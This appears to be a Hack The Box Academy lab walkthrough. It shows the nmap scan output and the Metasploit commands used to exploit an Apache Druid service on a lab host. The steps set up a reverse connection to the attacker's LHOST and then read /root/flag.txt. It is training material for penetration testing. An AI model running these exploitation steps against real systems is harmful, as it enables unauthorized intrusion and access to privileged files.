# https://academy.hackthebox.com/module/39/section/407

# Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.
# Target IP - 10.129.51.173

nmap -sV <TARGET_IP>
nmap -sV 10.129.51.173

# └──╼ [★]$ nmap -sV 10.129.51.173
# Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-21 20:29 BST
# Nmap scan report for 10.129.51.173
# Host is up (0.076s latency).
# Not shown: 995 closed tcp ports (conn-refused)
# PORT     STATE SERVICE VERSION
# 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
# 8081/tcp open  http    Jetty 9.4.12.v20180830
# 8082/tcp open  http    Jetty 9.4.12.v20180830
# 8083/tcp open  http    Jetty 9.4.12.v20180830
# 8888/tcp open  http    Jetty 9.4.12.v20180830
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done: 1 IP address (1 host up) scanned in 10.67 seconds

msfconsole -q
search apache druid
set RHOSTS 10.129.51.173
ifconfig tun0
# [*] exec: ifconfig tun0

# tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
#         inet 10.10.14.6  netmask 255.255.254.0  destination 10.10.14.6
#         inet6 fe80::f398:67b9:654b:d6fd  prefixlen 64  scopeid 0x20<link>
#         inet6 dead:beef:2::1004  prefixlen 64  scopeid 0x0<global>
#         unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
#         RX packets 2599  bytes 140581 (137.2 KiB)
#         RX errors 0  dropped 0  overruns 0  frame 0
#         TX packets 3571  bytes 3273568 (3.1 MiB)
#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
set LHOST 10.10.14.6
run
search -f flag.txt
cat /root/flag.txt